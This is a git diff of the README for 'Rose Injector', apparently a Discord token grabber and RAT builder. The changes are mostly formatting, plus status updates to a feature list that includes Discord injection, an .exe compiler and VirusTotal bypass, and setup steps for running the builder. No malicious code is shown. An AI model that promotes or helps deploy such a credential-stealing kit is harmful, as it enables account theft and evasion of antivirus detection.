@@ -13,7 +13,7 @@
     <img src="https://img.shields.io/github/languages/top/DamagingRose/Rose-Injector?color=%23000000">
     <img src="https://img.shields.io/github/stars/DamagingRose/Rose-Injector?color=%23000000&logoColor=%23000000">
     <br>
-    <img src="https://img.shields.io/github/commit-activity/w/DamagingRose/Rose-Injector?color=%23000000"> 
+    <img src="https://img.shields.io/github/commit-activity/w/DamagingRose/Rose-Injector?color=%23000000">
     <img src="https://img.shields.io/github/last-commit/DamagingRose/Rose-Injector?color=%23000000&logoColor=%23000000">
     <br>
     <img src="https://img.shields.io/github/issues/DamagingRose/Rose-Injector?color=%23000000&logoColor=%23000000">
@@ -62,14 +62,14 @@
 - `UI Integration`🟢
 - `Compiler (.exe)`🟢
 - `Make An Embebed Version`🟢
-- `Auto Update`🟡
+- `Auto Update`🟢
 - `Safe Mode For Testing Purposes`🔴
 - `Discord Injection`🟢
 - `MacOS Adaptation`🔴
-- `CHANGELOD.md file`🟡
-- `Bypass VirusTotal`🟡
+- `CHANGELOD.md file`🟢
+- `Bypass VirusTotal`🟣
 
-🟢 = Working  | 🟡 = To Do  | 🟣 = Working on it | 🔴 = Not Working
+🟢 = Working | 🟡 = To Do | 🟣 = Working on it | 🔴 = Not Working
 
 ## <a id="rose_rat"></a> 💀 〢 Rose RAT
 
@@ -78,20 +78,20 @@ You can check [this](https://github.com/DamagingRose/Rose-RAT) for informations
 
 ### <a id="prerequisites"></a> 💻 〢 Prerequisites
 
--   Windows 7/10/11
+- Windows 7/10/11
 
 `Following requirements are being installed automatically.`
--   **[Python](https://www.python.org)**
--   PyPi requirements
 
+- **[Python](https://www.python.org)**
+- PyPi requirements
 
 ### <a id="setup"></a> ⚙️ 〢 Setup
 
 Don't forget that the project is still under development release and might contain bugs.
 
-* [Download the repository](https://github.com/DamagingRose/Rose-Injector/archive/refs/heads/main.zip)
-* Run the start.bat to open up the Rose builder/Python installer.
-* Enjoy!
+- [Download the repository](https://github.com/DamagingRose/Rose-Injector/archive/refs/heads/main.zip)
+- Run the start.bat to open up the Rose builder/Python installer.
+- Enjoy!
 
 ## <a id="preview"></a> 📷 〢 Preview
 
@@ -99,15 +99,16 @@ Don't forget that the project is still under development release and might conta
 ![Injector](readme/injector.png)
 ![Locations](readme/locationss.png)
 
-## <a id="changelog"></a> 📚 〢 Changelog 
+## <a id="changelog"></a> 📚 〢 Changelog
 
 ## [1.0.0] - 2023-03-21
+
 First Release
 
-* Created a UI compiler for the Rose Grabber
-* Made the first version of the RAT
+- Created a UI compiler for the Rose Grabber
+- Made the first version of the RAT
 
-## <a id="contributs"></a> 🥷 〢 Contributors 
+## <a id="contributs"></a> 🥷 〢 Contributors
 
 <a href="https://github.com/DamagingRose/Rose-Injector/graphs/contributors">
   <img src="https://contrib.rocks/image?repo=DamagingRose/Rose-Injector" />
@@ -115,10 +116,11 @@ First Release
 
 ## <a id="bugsorerrors"></a> ⚠️ 〢 Bugs Or Errors?
 
--   To Report An Error Make An **[Issue](https://github.com/DamagingRose/Rose-Injector/issues)**
--   Or Join The **[Discord](https://discord.gg/CJpFKwSdyW)**
+- To Report An Error Make An **[Issue](https://github.com/DamagingRose/Rose-Injector/issues)**
+- Or Join The **[Discord](https://discord.gg/CJpFKwSdyW)**
 
 ## 🧾 <a id="lisence"></a> 〢 License
 
 ### This is for educational purposes only, use at your own risk, I am not responsible for any of your actions!
+
 ### Rose Injector is licensed under the <a href="https://mit-license.org/.">MIT License</a>
